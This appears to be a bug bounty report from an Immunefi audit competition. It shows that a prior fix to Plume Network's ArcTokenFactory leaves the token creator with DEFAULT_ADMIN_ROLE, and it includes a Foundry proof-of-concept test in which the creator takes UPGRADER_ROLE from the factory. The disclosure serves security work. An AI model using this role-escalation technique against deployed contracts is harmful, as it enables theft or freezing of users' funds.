# 52833 sc high bypass the fix of immunefi audit imm crit 01 token creator can upgrade arctoken implementation

**Submitted on Aug 13th 2025 at 14:03:53 UTC by @r1ver for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #52833
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcTokenFactory.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Permanent freezing of funds
  * Theft of unclaimed yield

## Description

### Brief/Intro

Before this Attackathon, the project had already undergone multiple audits. You can view Immunefi’s audit report at <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/audit/immunefi.pdf>. In that report, the CRITICAL issue IMM-CRIT-01: “Token Creator Can Upgrade ArcToken Implementation” remains present and exploitable even after the fix.

### Vulnerability Details

Based on the previous audit report, we can locate the vulnerability in arc/src/ArcTokenFactory.sol. In the `createToken` function, `UPGRADER_ROLE` is incorrectly assigned to `msg.sender`, i.e., the token creator. This means anyone can create their own token, and because the token creator is granted `UPGRADER_ROLE`, “I’m quoting from Immunefi’s audit report. the creator can upgrade the ArcToken contract at any time, bypassing the intended control of the ArcTokenFactory and potentially introduce malicious logic or vulnerabilities.” The proposed fix is to set `UPGRADER_ROLE` to `address(this)`.

Example of proposed role grants (from the prior report):

```solidity
token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender);
token.grantRole(token.ADMIN_ROLE(), msg.sender);
token.grantRole(token.MANAGER_ROLE(), msg.sender);
token.grantRole(token.YIELD_MANAGER_ROLE(), msg.sender);
token.grantRole(token.YIELD_DISTRIBUTOR_ROLE(), msg.sender);
token.grantRole(token.MINTER_ROLE(), msg.sender);
token.grantRole(token.BURNER_ROLE(), msg.sender);
token.grantRole(token.UPGRADER_ROLE(), address(this));
```

However, `DEFAULT_ADMIN_ROLE` still belongs to `msg.sender`, and `DEFAULT_ADMIN_ROLE` is the highest-privilege role—it can configure any other role, including itself:

* <https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L37-#L50>
* <https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L146-L176>

The code above shows that `DEFAULT_ADMIN_ROLE` can arbitrarily change the `UPGRADER_ROLE`. Since `msg.sender` still holds `DEFAULT_ADMIN_ROLE`, they can reassign `UPGRADER_ROLE` to themselves.

### Impact Details (quote from previous audit report)

This allows the token creator to call `upgradeToAndCall` on the `ArcToken` contract, giving them full control over the token's implementation. As a result, the creator can upgrade the `ArcToken` contract at any time, bypassing the intended control of the `ArcTokenFactory` and potentially introducing malicious logic or vulnerabilities. This undermines the security and trust assumptions of the `ArcTokenFactory`, as upgrades can occur without factory or governance oversight.

### References

* <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcTokenFactory.sol#L193-L200>
* <https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L37-#L50>
* <https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L146-L176>

## Proof of Concept

I wrote a test file in `arc/test/ArcTokenFactoryUpgradeVulnerability.t.sol`. You can run this test with:

```
forge test ArcTokenFactoryUpgradeVulnerability -vvv
```

Test source:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { ArcTokenFactory } from "../src/ArcTokenFactory.sol";
import { ArcToken } from "../src/ArcToken.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

// Import necessary restriction contracts and interfaces
import { IRestrictionsRouter } from "../src/restrictions/IRestrictionsRouter.sol";
import { ITransferRestrictions } from "../src/restrictions/ITransferRestrictions.sol";
import { IYieldRestrictions } from "../src/restrictions/IYieldRestrictions.sol";
import { RestrictionsRouter } from "../src/restrictions/RestrictionsRouter.sol";
import { WhitelistRestrictions } from "../src/restrictions/WhitelistRestrictions.sol";
import { YieldBlacklistRestrictions } from "../src/restrictions/YieldBlacklistRestrictions.sol";

contract ArcTokenFactoryUpgradeVulnerabilityTest is Test {
    ArcTokenFactory public factory;
    ERC20Mock public yieldToken;
    RestrictionsRouter public router;
    WhitelistRestrictions public whitelistModule;
    YieldBlacklistRestrictions public yieldBlacklistModule;
    
    address public tokenCreator;
    
    uint256 public constant INITIAL_SUPPLY = 1000e18;
    
    function setUp() public {
        tokenCreator = makeAddr("tokenCreator");
        
        // Deploy mock yield token
        yieldToken = new ERC20Mock();
        yieldToken.mint(address(this), 1_000_000e18);
        
        // Deploy infrastructure
        router = new RestrictionsRouter();
        router.initialize(address(this));
        
        yieldBlacklistModule = new YieldBlacklistRestrictions();
        yieldBlacklistModule.initialize(address(this));
        
        // Deploy factory
        factory = new ArcTokenFactory();
        factory.initialize(address(router)); // correctly initialize router address
    }
    
    function testVulnerability_DEFAULT_ADMIN_ROLE_CanControlUPGRADER_ROLE() public {
        console2.log("=== Testing DEFAULT_ADMIN_ROLE Control Over UPGRADER_ROLE ===");
        
        // 1) Create a token via the factory
        vm.startPrank(tokenCreator);
        ArcToken token = ArcToken(factory.createToken(
            "Test Token",
            "TEST",
            INITIAL_SUPPLY,
            address(yieldToken),
            "https://example.com/token", // tokenUri
            tokenCreator, // initialTokenHolder
            18 // decimals
        ));
        vm.stopPrank();
        
        console2.log("Token created at:", address(token));
        console2.log("Token creator:", tokenCreator);
        
        // 2) Verify UPGRADER_ROLE is initially held by the factory (not the creator)
        console2.log("\n--- Initial Role Assignments ---");
        console2.log("DEFAULT_ADMIN_ROLE holder:", token.hasRole(token.DEFAULT_ADMIN_ROLE(), tokenCreator));
        console2.log("UPGRADER_ROLE holder (factory):", token.hasRole(token.UPGRADER_ROLE(), address(factory)));
        console2.log("UPGRADER_ROLE holder (creator):", token.hasRole(token.UPGRADER_ROLE(), tokenCreator));
        
        assertTrue(token.hasRole(token.DEFAULT_ADMIN_ROLE(), tokenCreator), "Creator should have DEFAULT_ADMIN_ROLE");
        assertTrue(token.hasRole(token.UPGRADER_ROLE(), address(factory)), "Factory should have UPGRADER_ROLE");
        assertFalse(token.hasRole(token.UPGRADER_ROLE(), tokenCreator), "Creator should NOT have UPGRADER_ROLE initially");
        
        // 3) Creator (DEFAULT_ADMIN_ROLE holder) reassigns UPGRADER_ROLE to themselves
        console2.log("\n--- Exploiting the Vulnerability ---");
        console2.log("Token creator (DEFAULT_ADMIN_ROLE holder) grants UPGRADER_ROLE to themselves...");
        
        vm.startPrank(tokenCreator);
        token.revokeRole(token.UPGRADER_ROLE(), address(factory));
        token.grantRole(token.UPGRADER_ROLE(), tokenCreator);
        vm.stopPrank();
        
        // 4) Verify the creator now holds UPGRADER_ROLE
        console2.log("UPGRADER_ROLE holder (creator) after exploit:", token.hasRole(token.UPGRADER_ROLE(), tokenCreator));
        assertTrue(token.hasRole(token.UPGRADER_ROLE(), tokenCreator), "Creator should now have UPGRADER_ROLE");
        
        console2.log("\n=== Vulnerability Successfully Exploited ===");
        console2.log("DEFAULT_ADMIN_ROLE holder was able to grant themselves UPGRADER_ROLE");
        console2.log("Factory control completely bypassed!");
    }
}
```

Notes in test comments:

* The test demonstrates that although `UPGRADER_ROLE` may be assigned to the factory, the token creator retains `DEFAULT_ADMIN_ROLE` and can reassign `UPGRADER_ROLE` to themselves, enabling upgrades and full control.
